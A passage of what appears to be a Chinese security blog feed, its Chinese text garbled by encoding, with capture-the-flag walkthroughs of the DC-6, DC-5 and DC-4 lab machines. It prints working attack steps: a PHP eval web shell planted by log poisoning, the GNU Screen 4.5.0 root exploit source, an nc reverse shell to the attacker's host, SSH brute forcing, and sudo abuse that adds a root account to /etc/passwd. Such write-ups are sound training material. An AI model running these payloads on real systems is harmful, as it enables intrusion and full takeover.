<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
</blockquote>
<p><code>home/jens</code>ä¸‹å¯ä»¥ä¸éœ€è¦å¯†ç æ‰§è¡Œ</p>
<blockquote>
<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
</blockquote>
<p>å‘<code>bacjuos.sh</code>å†™å…¥ <code>/bin/bash</code></p>
<blockquote>
<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/â€˜ from member names<br>/home/jens/backups.sh: line 3: â€œ/bin/bashâ€: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<p>æˆåŠŸåˆ‡æ¢åˆ°jensç”¨æˆ·</p>
<p><code>sudo -l</code> è·å–jensæƒé™</p>
<blockquote>
<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
</blockquote>
<p>å‘ç°å¯ä»¥å…å¯†ä½¿ç”¨nmap</p>
<p>nmapææƒå‚è€ƒ<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
<p>nmapæŸ¥çœ‹ç‰ˆæœ¬</p>
<blockquote>
<p>jens@dc-6:~$ nmap -V</p>
<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
</blockquote>
<br>

<blockquote>
<p>TF=$(mktemp)<br>echo â€˜os.execute(â€œ/bin/shâ€)â€™ &gt; $TF<br>sudo nmap â€“script=$TF</p>
</blockquote>
<p>æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œç»“æœé¶æœºå´©äº†ï¼Œé‡ç½®ä¸€ä¸‹</p>
<p>é¶æœºipæ”¹æˆäº†192.168.18.139</p>
<p>sshè¿æ¥  <code>graham - GSo7isUM1D4</code></p>
<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
<blockquote>
<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/â€˜ from member names<br>/home/jens/backups.sh: line 3: â€œ/bin/bashâ€: No such file or directory<br>jens@dc-6:~$ </p>
</blockquote>
<blockquote>
<p>TF=$(mktemp)<br>echo â€˜os.execute(â€œ/bin/shâ€)â€™ &gt; $TF<br>sudo nmap â€“script=$TF</p>
</blockquote>
<p>æˆåŠŸä¸Šå‡ä¸ºrootæƒé™,è¿›å…¥/rootå¾—åˆ°flag<br><img src="/posts/e38f4498/flag.png"></p>
<br>

<br>

<p>æ€»ç»“</p>
<ul>
<li><p>wpscançˆ†ç ´</p>
</li>
<li><p>Activity monitor RCE</p>
</li>
<li><p>ncåå¼¹shell</p>
</li>
<li><p>sshè¿æ¥</p>
</li>
<li><p>nmapææƒ</p>
</li>
</ul>
<br>

<br>


<p>Reference</p>
<blockquote>
<p><a href="https://gtfobins.github.io/gtfobins/nmap">https://gtfobins.github.io/gtfobins/nmap</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges5</title>
    <url>/posts/7a861522/</url>
    <content><![CDATA[<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali      192.168.18.131</p>
<p>é¶æœº  192.168.18.136</p>
</blockquote>
<p>nmapæ‰«ç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sn 192.168.18.0/24<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:51 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.00035s latency).<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00044s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 4.25 seconds</p>
</blockquote>
<p>nmapæ‰«é¶æœºç«¯å£</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap 192.168.18.136 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-03 13:56 CST<br>Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan<br>Service scan Timing: About 66.67% done; ETC: 13:56 (0:00:06 remaining)<br>Nmap scan report for 192.168.18.136<br>Host is up (0.0015s latency).<br>Not shown: 65532 closed ports<br>PORT      STATE SERVICE VERSION<br><strong>80/tcp    open  http    nginx 1.6.2</strong><br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>60416/tcp open  status  1 (RPC #100024)<br>MAC Address: 00:0C:29:DA:A0:32 (VMware)</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds</p>
</blockquote>
<p>å¼€æ”¾äº†80ã€111å’Œ60416,80ç«¯å£ä½¿ç”¨çš„nginx</p>
<p>dirsearchæ‰«ç›®å½•<code>python3 dirsearch.py  -u 192.168.18.136</code></p>
<blockquote>
<p>[14:06:36] Starting:<br>[14:06:43] 200 -    4KB - /contact.php<br>[14:06:43] 301 -  184B  - /css  -&gt;  <a href="http://192.168.18.136/css/">http://192.168.18.136/css/</a><br>[14:06:44] 200 -    6KB - /faq.php<br>[14:06:45] 301 -  184B  - /images  -&gt;  <a href="http://192.168.18.136/images/">http://192.168.18.136/images/</a><br>[14:06:45] 403 -  570B  - /images/<br>[14:06:45] 200 -    4KB - /index.php<br>[14:06:48] 200 -  852B  - /thankyou.php                               </p>
</blockquote>
<p>è¿›å…¥ä¸»é¡µæ²¡çœ‹åˆ°å•¥æç¤ºï¼Œåªæœ‰ä¸€ä¸ªç•™è¨€æ¿ï¼Œéšä¾¿å¡«ä¸€ä¸‹çœ‹çœ‹æœ‰å•¥ä¸œè¥¿</p>
<p>æŠ“åŒ…å‘é€æ•°æ®ï¼Œå‘ç°å¤šæ¬¡å‘é€ä¸‹é¢çš„<code>Copyright Â© 2019</code>ä¼šå˜åŒ–</p>
<p>å¯ä»¥æ¨æµ‹ä½¿ç”¨äº†footer.phpï¼Œè®¿é—®footer.phpæ—¶å¹´ä»½ä¼šæ”¹å˜</p>
<p>è®¿é—®<code>http://192.168.18.136/footer.php</code>ï¼Œå¹´ä»½ä¼šå˜åŒ–</p>
<p>å¯ä»¥æ¨æµ‹thankyou.phpåŒ…å«äº†footer.php</p>
<p>è¯•ä¸€ä¸‹file=index.php<br><img src="/posts/7a861522/burp_fileindex.png"><br><img src="/posts/7a861522/file_index.png"><br><img src="/posts/7a861522/burp_fileetcpasswd.png"><br><br></p>
<p>ç”±äºæ—¶nginx,è®¿é—®ä¸‹ä»–çš„æ—¥å¿—</p>
<p><code>/var/log/nginx/error.log</code><br><img src="/posts/7a861522/burp_errorlog.png"><br><code>/var/log/nginx/access.log </code><br><img src="/posts/7a861522/burp_accesslog.png"><br>å°è¯•å†™å…¥æ—¥å¿—æ–‡ä»¶æ¥åå¼¹shell<br><img src="/posts/7a861522/burp_eval.png"><br><code>&lt;?php @eval($_REQUEST[&#39;cmd&#39;])?&gt;;</code><br><img src="/posts/7a861522/burp_phpinfo.png"><br>ä½¿ç”¨èšå‰‘è¿æ¥shell<br><img src="/posts/7a861522/antsword.png"><br>whoamiæŸ¥çœ‹æƒé™ä¸º<code>www-data</code>æ²¡æœ‰æƒé™å»è®¿é—®/root</p>
<p>ncå‘½ä»¤åå¼¹shell<br><img src="/posts/7a861522/nc_shell.png"><br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><br><br>ææƒ</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<blockquote>
<p>www-data@dc-5:~/html$ find / -perm -u=s -type f 2&gt;/dev/null<br>find / -perm -u=s -type f 2&gt;/dev/null<br>/bin/su<br>/bin/mount<br>/bin/umount<br>/bin/screen-4.5.0<br>/usr/bin/gpasswd<br>/usr/bin/procmail<br>/usr/bin/at<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/sbin/exim4<br>/sbin/mount.nfs</p>
</blockquote>
<p>ä½¿ç”¨screen</p>
<blockquote>
<p>kali@kali2020:~$ searchsploit screen 4.5.0</p>
<hr>
<p> Exploit Title                            |  Path</p>
<hr>
<p>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41152.txt<br>GNU Screen 4.5.0 - Local Privilege Escala | linux/local/41154.sh</p>
<hr>
<p>Shellcodes: No Results<br>kali@kali2020:<del>/Tools$ cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh<br>kali@kali2020:</del>/Tools$ cat 41154.sh </p>
</blockquote>
<p>æ ¹æ®è¯´æ˜ç¬¬ä¸€éƒ¨åˆ†ä¿å­˜ä¸º<code>libhax.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;unistd.h&gt;<br><strong>attribute</strong> ((<strong>constructor</strong>))<br>void dropshell(void){<br>    chown(â€œ/tmp/rootshellâ€, 0, 0);<br>    chmod(â€œ/tmp/rootshellâ€, 04755);<br>    unlink(â€œ/etc/ld.so.preloadâ€);<br>    printf(â€œ[+] done!\nâ€);<br>}</p>
</blockquote>
<p>ç¬¬äºŒéƒ¨åˆ†ä¿å­˜ä¸º<code>rootshell.c</code></p>
<blockquote>
<p>#include &lt;stdio.h&gt;<br>int main(void){<br>    setuid(0);<br>    setgid(0);<br>    seteuid(0);<br>    setegid(0);<br>    execvp(â€œ/bin/shâ€, NULL, NULL);<br>}</p>
</blockquote>
<p>ç¼–è¯‘</p>
<p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
<p><code>gcc -o rootshell rootshell.c</code></p>
<p>å°†ç¬¬ä¸‰éƒ¨åˆ†ä¿å­˜ä¸ºexp.sh</p>
<br>

<br>

<p>æŠŠä¸‰ä¸ªæ–‡ä»¶é€šè¿‡èšå‰‘ä¼ åˆ°é¶æœºä¸­<br><img src="/posts/7a861522/upload.png"><br><img src="/posts/7a861522/exp.png"><br><img src="/posts/7a861522/flag.png"></p>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges4</title>
    <url>/posts/d8125b4/</url>
    <content><![CDATA[<ul>
<li>ç¯å¢ƒ</li>
</ul>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24<br>kali   192.168.18.131<br>é¶æœº 192.168.18.135</p>
</blockquote>
<p>nmapæ‰«æç½‘æ®µ</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.0/24 -sn<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:06 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00038s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.135<br>Host is up (0.00022s latency).<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00016s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds</p>
</blockquote>
<p>nmapæ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.18.135 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-02 11:09 CST<br>Nmap scan report for 192.168.18.135<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)<br>80/tcp open  http    nginx 1.15.10<br>MAC Address: 00:0C:29:19:21:2F (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 7.86 seconds</p>
</blockquote>
<p>dirsearchæ‰«ä¸€ä¸‹ç›®å½•</p>
<blockquote>
<p>kali@kali2020:~/Tools/dirsearch$ sudo python3 dirsearch.py -u 192.168.18.135 </p>
<p>[11:14:19] Starting:<br>[11:14:25] 302 -  704B  - /command.php  -&gt;  index.php<br>[11:14:25] 301 -  170B  - /css  -&gt;  <a href="http://192.168.18.135/css/">http://192.168.18.135/css/</a><br>[11:14:26] 301 -  170B  - /images  -&gt;  <a href="http://192.168.18.135/images/">http://192.168.18.135/images/</a><br>[11:14:26] 403 -  556B  - /images/<br>[11:14:26] 200 -  506B  - /index.php<br>[11:14:27] 302 -  206B  - /login.php  -&gt;  index.php<br>[11:14:27] 302 -  163B  - /logout.php  -&gt;  index.php</p>
</blockquote>
<p>è¿›ä¸»é¡µçœ‹åˆ°ä¸€ä¸ªç™»å½•æ¡†</p>
<p><img src="/posts/d8125b4/index.png"></p>
<p>burpçˆ†ç ´adminå¾—åˆ°å¯†ç <code>happy</code></p>
<p>ç™»å½•åå‘ç°å¯ä»¥æ‰§è¡Œä¸€äº›å‘½ä»¤</p>
<p><img src="/posts/d8125b4/command.png"><br>burpæŠ“åŒ…çœ‹ä¸€ä¸‹<br><img src="/posts/d8125b4/burp_whoami.png"><br><br><br><img src="/posts/d8125b4/burp_catpasswd.png"><br><br><br>åå¼¹shell<br><img src="/posts/d8125b4/kali_nc.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888</p>
</blockquote>
<p>burpæ”¹åŒ…<br><img src="/posts/d8125b4/burp_nc.png"><br>radio=nc -e /bin/sh 192.168.18.131 8888 &amp;submit=Run</p>
<p>ä½¿ç”¨pythonå¾—åˆ°äº¤äº’å¼shell<br><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="/posts/d8125b4/shell.png"></p>
<blockquote>
<p>kali@kali2020:~$ nc -lvp 8888<br>listening on [any] 8888 â€¦<br>192.168.18.135: inverse host lookup failed: Unknown host<br>connect to [192.168.18.131] from (UNKNOWN) [192.168.18.135] 48192<br>python -c â€˜import pty;pty.spawn(â€œ/bin/bashâ€)â€™<br>www-data@dc-4:/usr/share/nginx/html$ whoami<br>whoami<br>www-data<br>www-data@dc-4:/usr/share/nginx/html$ </p>
</blockquote>
<p><code>cat /etc/passwd</code></p>
<p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p>
<blockquote>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
</blockquote>
<p>çœ‹ä¸‹charlesç”¨æˆ·æœ‰ä»€ä¹ˆ</p>
<blockquote>
<p>**www-data@dc-4:/home$ cd charles **</p>
<p>cd charles<br><strong>www-data@dc-4:/home/charles$ ls</strong><br>ls<br><strong>www-data@dc-4:/home/charles$ ls -l</strong><br>ls -l<br>total 0<br><strong>www-data@dc-4:/home/charles$ cd ls</strong><br>cd ls<br>bash: cd: ls: No such file or directory<br><strong>www-data@dc-4:/home/charles$ cat ls</strong><br>cat ls<br>cat: ls: No such file or directory<br>**www-data@dc-4:/home/charles$ **</p>
</blockquote>
<p>æŸ¥çœ‹jimç”¨æˆ·æœ‰ä»€ä¹ˆ,mboxæ²¡æƒé™è®¿é—®</p>
<blockquote>
<p>**www-data@dc-4:~$ cd /home/jim  **<br>cd /home/jim<br><strong>www-data@dc-4:/home/jim$ ls</strong><br>ls<br>backups  mbox  test.sh</p>
<p><strong>www-data@dc-4:/home/jim$ cat mbox</strong><br>cat mbox<br>cat: mbox: Permission denied<br>**www-data@dc-4:/home/jim$ **<br><strong>www-data@dc-4:/home/jim$ cd backups</strong><br>cd backups<br><strong>www-data@dc-4:/home/jim/backups$ ls</strong><br>ls<br>old-passwords.bak<br><strong>www-data@dc-4:/home/jim/backups$ cat old-passwords.bak</strong><br>cat old-passwords.bak</p>
<p>â€¦ â€¦ </p>
</blockquote>
<p>æŠŠå¯†ç ä¿å­˜åœ¨dc4_passwd.txt</p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo hydra -l jim -P ~/Tools/dc4_passwd.txt ssh://192.168.18.135</p>
<p>Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</p>
<p>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) starting at 2021-05-02 22:25:29<br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 253 login tries (l:1/p:253), ~16 tries per task<br>[DATA] attacking ssh://192.168.18.135:22/<br>[STATUS] 181.00 tries/min, 181 tries in 00:01h, 77 to do in 00:01h, 16 active</p>
<p>[22][ssh] host: 192.168.18.135   login: jim   password: jibril04<br>1 of 1 target successfully completed, 1 valid password found<br>[WARNING] Writing restore file because 4 final worker threads did not complete until end.<br>[ERROR] 4 targets did not resolve or could not be connected<br>[ERROR] 0 target did not complete<br>Hydra (<a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a>) finished at 2021-05-02 22:27:02</p>
</blockquote>
<p>å¾—åˆ° <code>jim  jibril04</code></p>
<p>è¿æ¥ssh</p>
<blockquote>
<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#x69;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;">&#106;&#x69;&#109;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#x2e;&#x31;&#x38;&#46;&#49;&#x33;&#x35;</a></strong></p>
<p>The authenticity of host â€˜192.168.18.135 (192.168.18.135)â€™ canâ€™t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added â€˜192.168.18.135â€™ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#105;&#x6d;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#x33;&#x35;">&#x6a;&#105;&#x6d;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#x33;&#x35;</a>â€˜s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
<p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
<p><strong>jim@dc-4:~$ pwd</strong></p>
<p>/home/jim</p>
<p>##çœ‹çœ‹æœ‰ä»€ä¹ˆå¯ä»¥ä½¿ç”¨çš„rootæƒé™å‘½ä»¤</p>
<p><strong>jim@dc-4:~$ sudo -l</strong></p>
<p>We trust you have received the usual lecture from the local System<br>Administrator. It usually boils down to these three things:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#1) Respect the privacy of others.</span><br><span class="line">#2) Think before you type.</span><br><span class="line">#3) With great power comes great responsibility.</span><br></pre></td></tr></table></figure>

<p>[sudo] password for jim:<br>Sorry, try again.<br>[sudo] password for jim:<br>Sorry, user jim may not run sudo on dc-4.<br>**jim@dc-4:~$ **</p>
<p><strong>jim@dc-4:~$ ls -l</strong><br>total 12<br>drwxr-xr-x 2 jim jim 4096 Apr  7  2019 backups<br>-rwâ€”â€”- 1 jim jim  528 Apr  6  2019 mbox<br>-rwsrwxrwx 1 jim jim  174 Apr  6  2019 test.sh<br><strong>jim@dc-4:~$ cat mbox</strong></p>
<p>From root@dc-4 Sat Apr 06 20:20:04 2019<br>Return-path: &lt;root@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000<br>Received: from root by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;root@dc-4&gt;)<br>        id 1hCiQe-0000gc-EC<br>        for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000<br>To: jim@dc-4<br>Subject: Test<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=â€UTF-8â€<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;<br>From: root &lt;root@dc-4&gt;<br>Date: Sat, 06 Apr 2019 20:20:04 +1000<br>Status: RO</p>
<p>This is a test.</p>
</blockquote>
<p>å¯ä»¥çœ‹åˆ°jimå‘äº†ä¸€æ¡ç”µå­é‚®ä»¶</p>
<p>å»çœ‹ä¸€ä¸‹./var/mail</p>
<blockquote>
<p><strong>jim@dc-4:~$ cd /var/mail</strong><br><strong>jim@dc-4:/var/mail$ ls</strong><br>jim<br><strong>jim@dc-4:/var/mail$ cd jim</strong><br>-bash: cd: jim: Not a directory<br><strong>jim@dc-4:/var/mail$ cat jim</strong><br>From charles@dc-4 Sat Apr 06 21:15:46 2019<br>Return-path: &lt;charles@dc-4&gt;<br>Envelope-to: jim@dc-4<br>Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000<br>Received: from charles by dc-4 with local (Exim 4.89)<br>        (envelope-from &lt;charles@dc-4&gt;)<br>        id 1hCjIX-0000kO-Qt<br>        for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000<br>To: jim@dc-4<br>Subject: Holidays<br>MIME-Version: 1.0<br>Content-Type: text/plain; charset=â€UTF-8â€<br>Content-Transfer-Encoding: 8bit<br>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;<br>From: Charles &lt;charles@dc-4&gt;<br>Date: Sat, 06 Apr 2019 21:15:45 +1000<br>Status: O</p>
<p>Hi Jim,</p>
<p>Iâ€™m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</p>
<p>Password is:  <strong>^xHhA&amp;hvim0y</strong></p>
<p>See ya,<br>Charles</p>
<p>**jim@dc-4:/var/mail$ **</p>
</blockquote>
<p>å‘ç°äº†Charlesçš„å¯†ç <code>^xHhA&amp;hvim0y</code></p>
<p>suçœ‹çœ‹èƒ½å¦åˆ‡æ¢åˆ°charles</p>
<blockquote>
<p><strong>jim@dc-4:~$ su charles</strong></p>
<p>Password:<br>**charles@dc-4:/home/jim$ **</p>
</blockquote>
<p>çœ‹çœ‹Charlesæœ‰ä»€ä¹ˆå¯ä»¥ä½¿ç”¨çš„rootå‘½ä»¤</p>
<blockquote>
<p><strong>charles@dc-4:~$ sudo -l</strong><br>Matching Defaults entries for charles on dc-4:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User charles may run the following commands on dc-4:<br>    (root) NOPASSWD: /usr/bin/teehee<br>**charles@dc-4:~$ **</p>
</blockquote>
<p>å‘ç°å¯ä»¥ä¸ä½¿ç”¨å¯†ç å°±èƒ½æ‰§è¡Œ<code>teehee</code></p>
<p>æœäº†ä¸€ä¸‹ å¯ä»¥åˆ©ç”¨<code>teehee</code>è¿›è¡Œææƒ</p>
<blockquote>
<p>teeheeå¯é€šè¿‡echo â€œxxxâ€|sudo teehee -a â€˜fileâ€™çš„æ–¹å¼å°†å†…å®¹å†™å…¥åˆ°ç”¨æˆ·æ— æ³•ç›´æ¥æ“ä½œçš„æ–‡ä»¶ä¸­</p>
</blockquote>
<p><img src="/posts/d8125b4/teeheeuser.png"></p>
<p>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash<br>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash<br>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash</p>
<p>ä¸ƒä¸ªå­—æ®µ</p>
<p>root:x:0:0:root:/root:/bin/bash</p>
<p>Mamor:x:0:0:::/bin/bash</p>
<p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
<blockquote>
<p>charles@dc-4:<del>$ echo â€œMamor:x:0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#x35;">&#x4d;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#x35;</a><br>The authenticity of host â€˜192.168.18.135 (192.168.18.135)â€™ canâ€™t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added â€˜192.168.18.135â€™ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#77;&#97;&#x6d;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a>â€˜s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;">&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#56;&#46;&#49;&#51;&#x35;</a>â€˜s password: </p>
<p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
</blockquote>
<p>æ„é€ å¤±è´¥ï¼Œé‡æ–°æ„é€ ä¸€ä¸ª</p>
<blockquote>
<p><strong>charles@dc-4:~$ echo â€œMamor111::0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd</strong></p>
<p>â€¦â€¦â€¦â€¦.</p>
<p>Mamor111::0:0:::/bin/bash</p>
<p><strong>charles@dc-4:~$ echo â€œMamor111::0:0:::/bin/bashâ€ |sudo teehee -a /etc/passwd</strong></p>
<p>Mamor111::0:0:::/bin/bash<br><strong>charles@dc-4:~$ su Mamor111</strong></p>
<p><strong>root@dc-4:/home/charles# ls</strong><br><strong>root@dc-4:/home/charles# cd ../</strong><br><strong>root@dc-4:/home# ls</strong><br>charles  jim  sam<br><strong>root@dc-4:/home# cd ../</strong><br><strong>root@dc-4:/# ls</strong><br>bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz<br>boot  home        lib             mnt    root  srv   usr  vmlinuz.old<br>dev   initrd.img  lost+found      opt    run   sys   var<br><strong>root@dc-4:/# cd root</strong><br><strong>root@dc-4:/root# ls</strong><br>flag.txt<br><strong>root@dc-4:/root# cat flag.txt</strong></p>
<p>888       888          888 888      8888888b.                             888 888 888 888<br>888   o   888          888 888      888  â€œY88b                            888 888 888 888<br>888  d8b  888          888 888      888    888                            888 888 888 888<br>888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888<br>888d88888b888 d8P  Y8b 888 888      888    888 d88â€â€88b 888 â€œ88b d8P  Y8b 888 888 888 888<br>88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P<br>8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      â€œ   â€œ   â€œ   â€œ<br>888P     Y888  â€œY8888  888 888      8888888Pâ€   â€œY88Pâ€  888  888  â€œY8888  888 888 888 888 </p>
<p>Congratulations!!!</p>
<p>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those<br>who have provided feedback, and who have taken time to complete these little<br>challenges.</p>
